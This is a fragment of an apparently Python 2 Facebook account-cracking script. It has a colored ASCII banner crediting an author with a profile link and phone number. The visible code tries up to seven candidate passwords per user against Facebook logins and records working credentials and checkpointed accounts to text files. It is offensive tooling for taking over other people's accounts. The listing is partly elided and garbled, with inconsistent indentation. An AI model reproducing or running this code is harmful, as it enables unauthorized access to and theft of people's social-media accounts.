...
\033[1;97m   ## ##      ##          ##     ## \033[1;0m
\033[1;97m  ##   ##     ##          ##     ## \033[1;0m
\033[1;97m ##     ## ##Arman*Khosti      ####      ##     ## \033[1;0m
\033[1;97m #########    ##          ##  ## ## \033[1;0m
\033[1;97m ##     ##    ##          ##    ##  \033[1;0m
\033[1;97m ##     ##    ##           ##### ## \033[1;0m
\033[1;97m--------------------------------------------------
\033[1;97m Mr Author    : Hazrt Arman

\033[1;97m Love     : No I have

\033[1;97m My FB : https://www.facebook.com/profile.php?id=100000274834300

\033[1;97m My Whatassp  : +93783361438
\033[1;97m--------------------------------------------------
"""
#call menu
def Furqan():
...
#clone Password
        ...
        try:
            ...
            if 'access_token' in q:
                print ' \x1b[1;92m(ARMAN_OK) ' + k + c + user + ' | ' + pass1
                okb = open('Qasim.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print ' \x1b[1;91m(ARMAN_CP) ' + k + c + user + ' | ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print ' \x1b[1;92m(ARMAN_OK)' + k + c + user + ' | ' + pass2
                    okb = open('HAZRT.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print ' \x1b[1;91m(ARMAN_CP) ' + k + c + user + ' | ' + pass2
                    okb = open('HAZRT.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print ' \x1b[1;92m(ARMAN_OK) ' + k + c + user + ' | ' + pass3
                        okb = open('HAZRT.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ' \x1b[1;91m(ARMAN_CP) ' + k + c + user + ' | ' + pass3
                        cps = open('HAZRT.txt', 'a')
                        ...
                        q = json.load(data)
                        if 'access_token' in q:
                            print ' \x1b[1;92m(ARMAN_OK) ' + k + c + user + ' | ' + pass4
                            okb = open('HAZRT.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print ' \x1b[1;91m(ARMAN_CP) ' + k + c + user + ' | ' + pass4
                            cps = open('HAZRT.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print ' \x1b[1;92m(ARMAN_OK) ' + k + c + user + ' | ' + pass5
                                okb = open('HAZRT.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;91m(ARMAN_CP) ' + k + c + user + ' | ' + pass5
                                cps = open('HAZRT.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print ' \x1b[1;92m(ARMAN_OK) ' + k + c + user + ' | ' + pass6
                                okb = open('HAZRT.txt', 'a')
                                okb.write(k + c + user + pass6 + '\n')
                                okb.close()
                                oks.append(c + user + pass6 )
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;91m(ARMAN_CP) ' + k + c + user + ' | ' + pass6
                                cps = open('HAZRT.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print ' \x1b[1;92m(ARMAN_OK) ' + k + c + user + ' | ' + pass7
                                okb = open('HAZRT.txt', 'a')
                                okb.write(k + c + user + pass7 + '\n')
                                okb.close()
                                oks.append(c + user + pass7 )
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;91m(ARMAN_CP) ' + k + c + user + ' | ' + pass7
                                cps = open('HAZRT.txt', 'a')
